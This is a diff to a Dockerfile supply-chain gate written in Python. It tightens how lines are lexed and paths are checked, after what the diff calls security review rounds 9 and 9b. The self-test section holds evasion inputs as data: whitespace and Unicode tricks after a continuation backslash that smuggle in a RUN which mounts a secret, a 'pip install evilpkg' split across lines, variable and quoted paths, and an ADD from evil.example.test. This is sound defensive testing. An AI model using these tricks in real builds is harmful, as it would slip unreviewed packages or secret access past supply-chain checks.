@@ -27,6 +27,13 @@ context `broker/`:
           --no-index --find-links /opt/wheels -r <path>
     where `<stage>` is an earlier stage on the same base image that fetched that same
     requirements file, so the installed interpreter is the one the wheels were chosen for.
+
+What the gate guarantees, and what it doesn't (security review rounds 9 and 9b):
+  * guaranteed: the CFS token is mounted only into the one templated fetch RUN, and the
+    canonical install installs exactly the checked requirements file, by hash, offline;
+  * not guaranteed: that no other RUN installs something. A RUN runs arbitrary shell, so
+    spotting other installers (`pip`, `uv`, ...) is a heuristic that catches mistakes, not
+    an attacker who spells the command indirectly. Dockerfile changes are reviewed code.
 """
 
 from __future__ import annotations
@@ -129,39 +136,54 @@ OPCODES = frozenset({"FROM", "RUN", "COPY", "ARG", "ENV", "USER", "WORKDIR", "CM
 
 
 def _instructions(path: Path):
-    """Yield (line, INSTRUCTION, args) with continuations joined as BuildKit does: the
-    keyword ends at any whitespace (BuildKit accepts tab, VT and FF there too). Control
-    characters other than tab, a heredoc, or an unknown keyword is an error, never a
-    skipped line (security review round 9)."""
-    text = path.read_text()
-    bad = next((c for c in text if (ord(c) < 32 and c not in "\t\n\r") or ord(c) == 127), None)
-    if bad is not None:
-        raise SupplyChainError(f"{rel(path)}: control character {bad!r} in a Dockerfile")
-    buf, start = "", 0
+    """Yield (line, INSTRUCTION, args) with continuations joined exactly as BuildKit joins
+    them. Anything the two could read differently is an error, never a guess (security
+    review rounds 9 and 9b):
+      * the file is read as bytes and must be printable ASCII plus tab and `\\n`; `\\r` only
+        directly before `\\n`; no other control or non-ASCII character (U+00A0, U+0085, ...);
+      * a backslash followed by whitespace at the end of a line is refused (BuildKit would
+        still continue; we don't emulate it);
+      * continuation lines are appended as they are: no added space, leading whitespace kept;
+      * the keyword ends at any whitespace; unknown keywords, SHELL and heredocs are refused."""
+    data = path.read_bytes()
+    if re.search(rb"\r(?!\n)", data):
+        raise SupplyChainError(f"{rel(path)}: carriage return not followed by a newline")
+    data = data.replace(b"\r\n", b"\n")
+    bad = re.search(rb"[^\x20-\x7e\t\n]", data)
+    if bad:
+        line = data[:bad.start()].count(b"\n") + 1
+        raise SupplyChainError(f"{rel(path)}:{line}: only printable ASCII, tab and newline are allowed "
+                               f"(found {bad.group(0)!r})")
+    text = data.decode("ascii")
+    buf, start = None, 0
     for n, raw in enumerate(text.split("\n") + [""], 1):
-        raw = raw.rstrip("\r")
         if DIRECTIVE_RE.match(raw):
             raise SupplyChainError(f"{rel(path)}:{n}: parser directives are not allowed "
                                    "(`# syntax=` runs an unpinned BuildKit frontend)")
+        if re.search(r"\\[ \t]+$", raw):
+            raise SupplyChainError(f"{rel(path)}:{n}: whitespace after a line-continuation backslash")
         s = raw.strip()
-        if s.startswith("#") or (buf and not s):
+        if s.startswith("#") or (buf is not None and not s):
             continue
-        if not buf:
+        if buf is None:
             if not s:
                 continue
-            start = n
-        if s.endswith("\\"):
-            buf += s[:-1] + " "
+            start, buf = n, ""
+            raw = raw.lstrip()
+        if raw.endswith("\\"):
+            buf += raw[:-1]
             continue
-        buf += s
+        buf += raw
         m = re.match(r"(\S+)\s*(.*)$", buf, re.S)
-        buf = ""
+        buf = None
         word, args = m.group(1).upper(), m.group(2).strip()
         if word not in OPCODES:
             raise SupplyChainError(f"{rel(path)}:{start}: unknown or disallowed instruction {word[:20]!r}")
         if word in ("RUN", "COPY") and "<<" in args:
             raise SupplyChainError(f"{rel(path)}:{start}: heredocs are not allowed (they cannot be checked)")
         yield start, word, args
+    if buf is not None:
+        raise SupplyChainError(f"{rel(path)}:{start}: dangling line continuation at end of file")
 
 
 @dataclass
@@ -211,6 +233,9 @@ def _split_flags(args: str) -> tuple[list[str], str]:
 
 WHEELS_DIR = "/opt/pipfetch/"
 FETCH_SCRIPT_DEST = WHEELS_DIR + "pip-fetch.py"
+# COPY destinations and `-r` paths the gate tracks: plain absolute paths only, so BuildKit
+# (which expands $VAR in COPY from ENV/ARG) and the RUN shell resolve them identically.
+SAFE_PATH = re.compile(r"^/[A-Za-z0-9_./-]+$")
 PIP_TOKEN_RE = re.compile(r"PIP_(?!SOURCE$)|pip\.conf|pydistutils", re.I)
 
 
@@ -317,7 +342,7 @@ def scan_dockerfile(df: Path, image_refs: set[str]) -> tuple[list[Install], list
                 if rest and (dest == rest[-1] or dest.startswith(rest[-1].rstrip("/") + "/")
                              or posixpath.normpath(rest[-1]) == posixpath.normpath(dest)):
                     copies.pop(dest)  # anything a later COPY may overwrite is no longer tracked
-            if not flags and len(rest) == 2 and posixpath.normpath(rest[1]) == rest[1]:
+            if not flags and len(rest) == 2 and posixpath.normpath(rest[1]) == rest[1] and SAFE_PATH.match(rest[1]):
                 copies[rest[1]] = _resolve_copy_src(df, rest[0])
         elif op == "RUN":
             if args.startswith("["):
@@ -343,7 +368,10 @@ def scan_dockerfile(df: Path, image_refs: set[str]) -> tuple[list[Install], list
                     target = copies.get(cmd[-1])
                     src = bind.group(1).lower() if bind else None
                     copied_now = prev[0] == "COPY" and prev[1].split()[-1:] == [cmd[-1]]
-                    if i != 0 or not copied_now:
+                    first = re.split(r"&&|\|\||[;|&\n]", script, maxsplit=1)[0]
+                    if not SAFE_PATH.match(cmd[-1]) or re.search(r"[$'\"\\`]", first):
+                        err(n, "the install command must be plain text: no $, quotes, backslashes or backticks")
+                    elif i != 0 or not copied_now:
                         err(n, "the install must be the first command of the RUN directly after the COPY of "
                                "its requirements file")
                     elif not isinstance(target, Path):
@@ -457,6 +485,16 @@ def self_test() -> list[str]:
         head + f"RUN {bind} true && {canon} /r.txt",
         head + f"RUN {bind} export P\"IP_\"REQUIREMENT=/e.txt && {canon} /r.txt",
         head + f"RUN {bind} PIP_REQUIREMENT=/e.txt {canon} /r.txt",
+        # Review round 9b: continuation lexing must match BuildKit, or fail closed.
+        head + install + "\nCMD echo hi \\\u00a0\nRUN --mount=type=secret,id=cfs_feed_token,required=false true",
+        head + install + "\nCMD echo hi \\\u0085\nRUN --mount=type=secret,id=cfs_feed_token,required=false true",
+        head + install + "\nCMD echo hi \\\r \nRUN --mount=type=secret,id=cfs_feed_token,required=false true",
+        head + install + "\nCMD echo hi \\ \nRUN --mount=type=secret,id=cfs_feed_token,required=false true",
+        head + install + "\nCMD echo hi\rRUN true",
+        head + install + "\nRUN p\\\nip install evilpkg",
+        head.replace("COPY requirements.txt /r.txt\n", "COPY requirements.txt $HOME/r.txt\n")
+        + f"RUN {bind} {canon} $HOME/r.txt",
+        head + f"RUN {bind} {canon} \"/r.txt\"",
         head + "ADD https://evil.example.test/x /x",
         head + f"COPY --from=other@sha256:{h} /x /x",
         head + f"RUN --mount=type=bind,from=other@sha256:{h},target=/m true",
